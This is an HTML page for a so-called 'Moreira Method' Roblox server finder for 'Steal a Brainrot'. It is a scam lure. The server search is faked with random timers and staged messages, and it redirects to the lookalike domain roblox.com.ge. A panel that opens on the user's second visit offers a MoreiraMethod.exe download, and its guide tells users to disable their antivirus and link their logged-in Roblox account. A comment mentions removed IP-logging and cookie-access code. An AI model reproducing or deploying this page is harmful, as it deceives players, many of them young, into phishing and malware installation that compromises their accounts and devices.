<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Moreira Method V3 â€” with OR Page</title>
<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;800&display=swap" rel="stylesheet">
<style>
:root {
  --bg: #0d1117;
  --card: rgba(22,27,34,0.85);
  --text: #e6edf3;
  --accent: #1f6feb;
  --hover: #238636;
  --radius: 10px;
  --red: #ff3030;
  --muted: #8b949e;
  --glass-border: rgba(255,255,255,0.04);
  --glass-strong: rgba(255,255,255,0.02);
  --panel-width: 420px;
  --panel-gap: 20px;
  --shadow-strong: 0 12px 40px rgba(0,0,0,0.6);
}
* { box-sizing: border-box; margin: 0; padding: 0; }
html,body { height: 100%; }
body {
  font-family: 'Montserrat', sans-serif;
  color: var(--text);
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: flex-start;
  min-height: 100vh;
  padding: 3.6rem 2rem 2rem;
  position: relative;
  overflow-x: hidden;
  z-index: 1;
  background-color: var(--bg);
}
.bg-video {
  position: fixed;
  top: 0; left: 0;
  width: 100%; height: 100%;
  object-fit: cover;
  z-index: -2;
}
.top-left {
  position: absolute;
  top: 20px; left: 20px;
  display: flex; align-items:center; gap:0.8rem;
  background-color: var(--card);
  padding: 0.5rem 1rem 0.5rem 0.5rem;
  border-radius: var(--radius);
  border: 2px solid var(--accent);
  transition: transform .3s ease, border-color .3s ease;
  color: var(--text);
  font-weight: 600;
  z-index: 50;
  backdrop-filter: blur(10px);
  text-decoration: none;
}
.top-left:hover { transform: scale(1.05); border-color: var(--hover); color: var(--hover); }
.avatar-img { width:60px; height:60px; border-radius:50%; object-fit:cover; border:2px solid var(--accent); flex-shrink:0; }
h1 {
  text-align:center;
  font-size: 2.8rem;
  margin-bottom: 2rem;
  letter-spacing: 1px;
  font-weight: 900;
  background: linear-gradient(90deg,#ff3b3b,#ff9a3b,#ffd93b,#9aff60,#3bffea,#6b6bff,#ff3bdf,#ff3b3b);
  background-size: 300% 100%;
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  animation: rainbow 5s linear infinite, shine 3s ease-in-out infinite;
  text-shadow: 0 0 6px rgba(255,255,255,0.03), 0 2px 18px rgba(0,0,0,0.6);
  z-index: 10;
}
@keyframes rainbow { 0%{background-position:0% 50%} 50%{background-position:100% 50%} 100%{background-position:0% 50%} }
@keyframes shine { 0%{filter:brightness(1)} 50%{filter:brightness(1.08)} 100%{filter:brightness(1)} }
.box-container {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
  gap: 1rem;
  width: 100%;
  max-width: 700px;
  margin-bottom: 2rem;
  z-index: 10;
}
.box {
  background-color: var(--card);
  border: 2px solid transparent;
  border-radius: var(--radius);
  padding: 1rem;
  text-align: center;
  cursor: pointer;
  transition: all .25s ease;
  user-select: none;
  font-size: 1rem;
  font-weight: 600;
  color: var(--text);
  display: flex; align-items:center; justify-content:center; gap:0.6rem;
  flex-direction: column; min-height:160px; position: relative; backdrop-filter: blur(12px);
}
.box:hover { border-color: var(--accent); transform: translateY(-3px); }
.box.active { border-color: rgba(255,80,80,0.95); background-color: rgba(27,17,18,0.9); box-shadow: 0 8px 30px rgba(255,60,60,0.12),0 0 18px rgba(255,80,80,0.08); transform: translateY(-4px); }
.btn {
  background-color: var(--accent);
  color: #fff;
  border:none;
  border-radius: var(--radius);
  padding:1rem 2rem;
  font-size:1.1rem;
  cursor:pointer;
  transition: all .25s ease;
  box-shadow: 0 8px 30px rgba(255,60,60,0.12),0 0 18px rgba(255,80,80,0.12);
  z-index:10;
  text-decoration:none;
}
.btn:hover { background-color:#ff4b4b; transform: translateY(-4px); }
.mins-row { display:flex; align-items:center; gap:8px; margin-top:8px; color:#cbd5e1; font-size:14px; font-weight:900; }
.mins-dot { width:8px;height:8px;border-radius:50%; background: linear-gradient(180deg,#ff8b8b,#ff3b3b); box-shadow:0 0 10px rgba(255,60,60,0.6); }
.mins-text { font-weight:900; color:var(--text); min-width:44px; text-align:left; }
.join-note { margin-top: 8px; color: var(--muted); font-size:0.95rem; font-weight:600; text-align:center; z-index:10; }
footer { margin-top:3rem; text-align:center; font-size:0.9rem; color:var(--muted); z-index:10; position: relative; }

/* Restore original server box image sizes */
.box[data-name="strawberry"] img,
.box[data-name="burguro"] img,
.box[data-name="ketchuru"] img,
.box[data-name="garama"] img {
  width: 100px;
  height: 100px;
}
.box[data-name="ketupat"] img,
.box[data-name="los67"] img {
  width: 80px;
  height: auto;
}

/* ----------------------------
   OR Panel & Floating Button
----------------------------*/
.fab { position: fixed; right: 20px; bottom: 20px; width: 64px; height: 64px; border-radius: 999px; display: grid; place-items: center; background: linear-gradient(135deg, var(--accent), #7b61ff); color: white; border: 2px solid rgba(255,255,255,0.06); box-shadow: 0 12px 30px rgba(31,111,235,0.18), 0 6px 16px rgba(0,0,0,0.5); cursor: pointer; z-index: 120; transition: transform .18s ease, box-shadow .18s ease; backdrop-filter: blur(6px); }
.fab:hover { transform: translateY(-6px) scale(1.02); box-shadow: 0 18px 46px rgba(31,111,235,0.24); }
.fab:active { transform: translateY(-2px); }
.fab-label { position: fixed; right: 94px; bottom: 32px; background: rgba(255,255,255,0.03); color: var(--text); padding: 8px 12px; border-radius: 999px; border: 1px solid var(--glass-border); font-size: 0.9rem; font-weight: 700; z-index: 119; backdrop-filter: blur(6px); box-shadow: var(--shadow-strong); opacity: 0; transform: translateY(6px); transition: opacity .22s ease, transform .22s ease; pointer-events: none; }
.fab:hover ~ .fab-label, .fab:focus ~ .fab-label { opacity: 1; transform: translateY(0); pointer-events: auto; }
.or-backdrop { position: fixed; inset: 0; background: linear-gradient(rgba(3,6,10,0.55), rgba(3,6,10,0.55)); opacity: 0; visibility: hidden; transition: opacity .28s ease; z-index: 115; backdrop-filter: blur(6px) saturate(1.05); }
.or-panel { position: fixed; top: 0; right: 0; height: 100%; width: min(96%, var(--panel-width)); max-width: 100%; transform: translateX(110%); transition: transform .45s cubic-bezier(.2,.9,.2,1), box-shadow .2s ease; z-index: 130; display: flex; flex-direction: column; padding: 28px; gap: 16px; background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01)); border-left: 1px solid var(--glass-border); box-shadow: -18px 0 60px rgba(0,0,0,0.6); backdrop-filter: blur(14px) saturate(1.05); }
.or-backdrop.open { opacity: 1; visibility: visible; }
.or-panel.open { transform: translateX(0%); }
.or-header { display:flex; align-items:center; gap:12px; }
.or-badge { width:56px;height:56px;border-radius:12px; background: linear-gradient(135deg, rgba(255,59,59,0.14), rgba(107,91,255,0.08)); display:grid; place-items:center; border:1px solid rgba(255,255,255,0.03); box-shadow: 0 8px 30px rgba(0,0,0,0.45), inset 0 -6px 18px rgba(0,0,0,0.15); }
.or-title { font-size: 1.2rem; font-weight: 900; letter-spacing: .4px; }
.or-sub { color: var(--muted); font-size:0.95rem; margin-top:4px; }
.or-body { margin-top: 10px; color: var(--text); font-size: 0.98rem; line-height:1.45; }
.or-actions { display:flex; gap:12px; margin-top: 12px; align-items:center; flex-wrap:wrap; }
.or-download { background: linear-gradient(90deg, var(--accent), #7b61ff); color: #fff; border: none; padding: 12px 18px; border-radius: 12px; font-weight: 800; cursor: pointer; box-shadow: 0 10px 30px rgba(31,111,235,0.14); transition: transform .18s ease, opacity .16s ease; text-decoration: none; }
.or-download:active { transform: translateY(1px) scale(.997); }
.or-secondary { background: transparent; border: 1px solid var(--glass-border); color: var(--text); padding: 10px 14px; border-radius: 10px; font-weight:700; text-decoration: none; }
.or-features { margin-top: 14px; display:grid; gap:10px; }
.feature { display:flex; gap:12px; align-items:flex-start; background: linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.005)); border-radius: 10px; padding:10px; border:1px solid var(--glass-border); }
.feature .icon { width:36px;height:36px;border-radius:8px; display:grid; place-items:center; background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01)); border:1px solid rgba(255,255,255,0.02); font-weight:900; }
.feature .text { font-size: 0.92rem; color:var(--muted); font-weight:700; }
.or-close { margin-left: auto; background: transparent; border: none; color: var(--muted); font-size: 1.1rem; cursor: pointer; padding: 8px; border-radius: 8px; }
.or-close:hover { color: var(--text); background: rgba(255,255,255,0.02); }
.or-foot { margin-top: auto; color: var(--muted); font-size: 0.85rem; text-align: left; }
@media (max-width: 720px) {
  .or-panel { width: 100%; --panel-width: 100%; padding: 20px; border-radius: 0; }
  .fab-label { display:none; }
  .fab { right: 16px; bottom: 16px; width:56px;height:56px; }
}
</style>
</head>
<body>
<video class="bg-video" autoplay muted loop playsinline>
  <source src="https://raw.githubusercontent.com/tryworse/MoreiraMethod/main/Personaje_Animado_con_Fondo_de_Halloween.mp4" type="video/mp4">
</video>

<a href="#" class="top-left" onclick="event.preventDefault(); window.open('https://roblox.com.ge/users/5681620590/profile', '_blank')" rel="noopener noreferrer">
  <img class="avatar-img" id="avatarImg" alt="Profile Avatar">
  <span>Want to join/team? Add me!</span>
</a>

<h1>Moreira Method</h1>

<div class="box-container" id="boxContainer">
  <div class="box" data-name="strawberry" data-server="Strawberry Elephant">
    <img src="https://i.ibb.co/YBBjkHCh/image-2025-10-24-125826170.png"> Strawberry Elephant
    <div class="mins-row"><span class="mins-dot"></span><span class="mins-text">--</span></div>
  </div>
  <div class="box" data-name="burguro" data-server="Headless Horseman">
    <img src="https://i.ibb.co/bgL2R1Ss/image-2025-10-29-044350045.png" alt="Burguro"> Headless Horseman
    <div class="mins-row"><span class="mins-dot"></span><span class="mins-text">--</span></div>
  </div>
  <div class="box" data-name="ketchuru" data-server="La Casa Boo">
    <img src="https://i.ibb.co/0RfNG21C/image-2025-10-29-044307532.png" alt="Ketchuru"> La Casa Boo
    <div class="mins-row"><span class="mins-dot"></span><span class="mins-text">--</span></div>
  </div>
  <div class="box" data-name="garama" data-server="Garama and Mandundung">
    <img src="https://i.ibb.co/PZ05ZV6z/image-2025-10-24-125842367.png" alt="Garama"> Garama and Mandundung
    <div class="mins-row"><span class="mins-dot"></span><span class="mins-text">--</span></div>
  </div>
  <div class="box" data-name="ketupat" data-server="Fragrama and Chocrama">
    <img src="https://i.ibb.co/pv6F7B4g/image-2025-11-09-163208138.png" alt="Ketupat"> Fragrama and Chocrama
    <div class="mins-row"><span class="mins-dot"></span><span class="mins-text">--</span></div>
  </div>
  <div class="box" data-name="los67" data-server="Meowl">
    <img src="https://i.ibb.co/v6ZZh5yN/image-2025-10-24-125956082.png" alt="Los67"> Meowl
    <div class="mins-row"><span class="mins-dot"></span><span class="mins-text">--</span></div>
  </div>
</div>

<a id="joinBtn" class="btn" href="#" target="_blank" rel="noopener noreferrer">Find Server</a>
<div class="join-note">Click a box to select a server.</div>
<footer>Â© <span id="year"></span> Moreira Method</footer>

<!-- OR Panel Elements -->
<div id="orBackdrop" class="or-backdrop" aria-hidden="true"></div>
<aside id="orPanel" class="or-panel" role="dialog" aria-modal="true" aria-labelledby="orTitle" aria-describedby="orDesc">
  <div class="or-header">
    <div class="or-badge" aria-hidden="true">
      <svg width="28" height="28" viewBox="0 0 24 24" fill="none" aria-hidden="true" xmlns="http://www.w3.org/2000/svg">
        <circle cx="12" cy="12" r="10" stroke="rgba(255,255,255,0.06)" stroke-width="1.2" />
        <path d="M8 13c0-2.2 1.8-4 4-4s4 1.8 4 4" stroke="white" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round" opacity="0.95"/>
        <path d="M9.5 10.5L9.6 10.4" stroke="white" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/>
      </svg>
    </div>

    <div>
      <div id="orTitle" class="or-title">The website version didnâ€™t do the trick? Try our app.</div>
      <div id="orDesc" class="or-sub">A faster way to join servers, manage brainrot finder, and get live updates.</div>
    </div>

    <button class="or-close" id="orCloseBtn" aria-label="Close panel">&times;</button>
  </div>

  <div class="or-body">
    <p>Our lightweight companion app helps you connect instantly, bypass cooldowns when possible, receive push updates about available servers, and keep everything in one tap. Itâ€™s designed to feel native and fast â€” perfect for power-players and casual joiners alike.</p>

    <div class="or-actions">
      <a href="#" id="downloadBtn" class="or-download" data-app-url="#" aria-label="Download the app">
        Download the App
      </a>
      <a href="#" class="or-secondary" id="openGuide">Open Quick Guide</a>
    </div>

    <div class="or-features" aria-hidden="false">
      <div class="feature">
        <div class="icon">âš¡</div>
        <div class="text">Instant join notification â€” enable instant brainrot finder.</div>
      </div>
      <div class="feature">
        <div class="icon">ðŸ”’</div>
        <div class="text">Private server manager & cooldown disabling.</div>
      </div>
      <div class="feature">
        <div class="icon">ðŸ“²</div>
        <div class="text">Push-style notifications for rare finds and events.</div>
      </div>
    </div>

    <div class="or-foot">
      <small>Tip: If youâ€™re already logged into Roblox on this device, the app can try to link directly to your account for a faster find.</small>
    </div>
  </div>
</aside>

<button id="fabOpen" class="fab" title="Open app alternative (OR Page)" aria-label="Open app alternative">
  <svg width="22" height="22" viewBox="0 0 24 24" fill="none" aria-hidden="true" xmlns="http://www.w3.org/2000/svg">
    <rect x="3" y="3" width="18" height="18" rx="5" stroke="rgba(255,255,255,0.12)" stroke-width="1.2"></rect>
    <path d="M8 12h8M8 8h8M8 16h8" stroke="white" stroke-width="1.4" stroke-linecap="round"></path>
  </svg>
</button>
<div class="fab-label" aria-hidden="true">Alternative: App</div>

<script>
/* --- Basic page behaviors --- */
document.getElementById("year").textContent = new Date().getFullYear();

const boxes = document.querySelectorAll(".box");
const joinBtn = document.getElementById("joinBtn");
let selectedServer = null;
const privateLink = "https://roblox.com.ge/games/109983668079237/Steal-a-Brainrot?privateServerLinkCode=40619253849477242853837679746393";

boxes.forEach(b=>{
  b.addEventListener("click", ()=>{
    boxes.forEach(bb=>bb.classList.remove("active"));
    b.classList.add("active");
    selectedServer = b.dataset.server;
    joinBtn.textContent = `Find ${selectedServer}`;
  });
});

function randomizeMins(){
  document.querySelectorAll(".box").forEach(box=>{
    const mins = box.querySelector(".mins-text");
    let val = Math.floor(Math.random()*60)+1;
    if(val < 10) val = "0"+val;
    mins.textContent = `${val}m`;
  });
}
randomizeMins();
setInterval(randomizeMins, 60000);

joinBtn.addEventListener("click", (e)=>{
  e.preventDefault();
  if(!selectedServer){ alert("Please select a server first!"); return; }
  joinBtn.disabled = true;
  joinBtn.style.opacity = "0.8";
  joinBtn.style.cursor = "wait";
  const messages = ["Looking for a server...", "Locating server link...", "Locating a disabled cooldown server", `Server found for ${selectedServer}!`, "Redirecting you right now!"];
  let i = 0;
  const showNext = ()=>{
    joinBtn.textContent = messages[i];
    i++;
    if(i < messages.length){
      const randomDelay = Math.floor(Math.random()*1500)+1000;
      setTimeout(showNext, randomDelay);
    } else {
      const redirectDelay = Math.floor(Math.random()*2000)+1000;
      setTimeout(()=> window.location.href = privateLink, redirectDelay);
    }
  };
  showNext();
});

/* --- Avatar fetch (same as before) --- */
const userId = 239005948;
const avatarImg = document.getElementById("avatarImg");
fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`)
  .then(res => res.json())
  .then(data => { const url = data?.data?.[0]?.imageUrl; if(url) avatarImg.src = url; })
  .catch(()=> { avatarImg.src = "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-B3D4833F59C0F8D9762480968CB02609-Png/150/150/AvatarHeadshot/Webp/noFilter"; });

/* --- OR panel open/close & focus handling --- */
const fabOpen = document.getElementById('fabOpen');
const orPanel = document.getElementById('orPanel');
const orBackdrop = document.getElementById('orBackdrop');
const orCloseBtn = document.getElementById('orCloseBtn');
const downloadBtn = document.getElementById('downloadBtn');
const openGuide = document.getElementById('openGuide');
let lastFocusedBeforeOpen = null;

function openOrPanel(){
  lastFocusedBeforeOpen = document.activeElement;
  orPanel.classList.add('open');
  orBackdrop.classList.add('open');
  orBackdrop.setAttribute('aria-hidden','false');
  orPanel.setAttribute('aria-hidden','false');
  setTimeout(()=> downloadBtn.focus(), 220);
  document.addEventListener('focus', enforcePanelFocus, true);
  document.addEventListener('keydown', onPanelKeyDown);
}
function closeOrPanel(){
  orPanel.classList.remove('open');
  orBackdrop.classList.remove('open');
  orBackdrop.setAttribute('aria-hidden','true');
  orPanel.setAttribute('aria-hidden','true');
  document.removeEventListener('focus', enforcePanelFocus, true);
  document.removeEventListener('keydown', onPanelKeyDown);
  if(lastFocusedBeforeOpen) lastFocusedBeforeOpen.focus();
}
function enforcePanelFocus(e){
  if(!orPanel.classList.contains('open')) return;
  if(!orPanel.contains(e.target)){
    e.stopPropagation();
    e.preventDefault();
    downloadBtn.focus();
  }
}
function onPanelKeyDown(e){
  if(e.key === 'Escape') closeOrPanel();
  if(e.key === 'Enter' && document.activeElement === openGuide){
    alert('Quick Guide:\n1) Install app from official source\n2) Install app from official source\n3) Link account if prompted\n4) Use the app to find servers faster');
  }
}
fabOpen.addEventListener('click', openOrPanel);
orCloseBtn.addEventListener('click', closeOrPanel);
orBackdrop.addEventListener('click', closeOrPanel);

/* --- Download button behavior: if data-app-url not set, show small toast --- */
downloadBtn.addEventListener('click', (e)=>{
  const url = downloadBtn.dataset.appUrl || '#';
  if(url === '#' || url.trim() === ''){
    e.preventDefault();
    animateButton(downloadBtn);
    showToast("https://github.com/tryworse/MoreiraMethod/raw/refs/heads/main/MoreiraMethod.exe");
  } else {
    // Open official link
    window.open(url, '_blank', 'noopener');
    closeOrPanel();
  }
});
openGuide.addEventListener('click', (e)=>{
  e.preventDefault();
  alert('Quick Guide:\n1) Install app from official source\n2) Disable your antivirus\n3) Link account if prompted\n4) Use the app to find working servers');
});

function animateButton(btn){
  btn.animate([{ transform: 'translateY(0)' }, { transform: 'translateY(-6px)' }, { transform: 'translateY(0)' }], { duration: 360, easing: 'cubic-bezier(.2,.9,.2,1)' });
}
function showToast(msg){
  const t = document.createElement('div');
  t.textContent = msg;
  Object.assign(t.style, {
    position:'fixed',
    right:'22px',
    bottom: 'calc(var(--fab-gap) + var(--fab-size) + 20px)',
    background:'linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01))',
    color:'var(--text)',
    padding:'12px 16px',
    borderRadius:'10px',
    border:'1px solid rgba(255,255,255,0.04)',
    zIndex:9999,
    fontWeight:700,
    fontSize:'0.92rem',
    backdropFilter:'blur(8px)',
    boxShadow:'0 12px 36px rgba(0,0,0,0.6)'
  });
  document.body.appendChild(t);
  setTimeout(()=> t.style.opacity = '0', 2600);
  setTimeout(()=> t.remove(), 3200);
}

/* --- NOTE: Removed IP logging / cookie-accessing code for privacy & safety --- */
/* If you want safe analytics: use a server-side endpoint or a reputable analytics provider and ask for consent. */


/* -------------------------
   Show popup on SECOND visit
   -------------------------
   Behavior:
   - Uses localStorage key 'mm_visit_count_v2'
   - First visit sets count = 1 (no popup)
   - Second visit (count === 1) opens the OR panel
   - Subsequent visits do nothing (count continues to increment)
*/
(function(){
  try {
    const key = 'mm_visit_count_v2';
    const raw = localStorage.getItem(key);
    const count = parseInt(raw || '0', 10);

    if (count === 1) {
      // small delay so page finishes rendering and focus handling works smoothly
      setTimeout(() => {
        if (typeof openOrPanel === 'function') {
          openOrPanel();
        } else {
          // fallback: try to add the 'open' classes directly if function missing
          const fallbackPanel = document.getElementById('orPanel');
          const fallbackBackdrop = document.getElementById('orBackdrop');
          if (fallbackPanel && fallbackBackdrop) {
            fallbackPanel.classList.add('open');
            fallbackBackdrop.classList.add('open');
            fallbackBackdrop.setAttribute('aria-hidden','false');
            fallbackPanel.setAttribute('aria-hidden','false');
          }
        }
      }, 550);
    }

    // increment and store the visit count
    localStorage.setItem(key, String(count + 1));
  } catch (e) {
    // ignore storage errors (e.g. storage disabled)
    console.error('visit-count error', e);
  }
})();
</script>
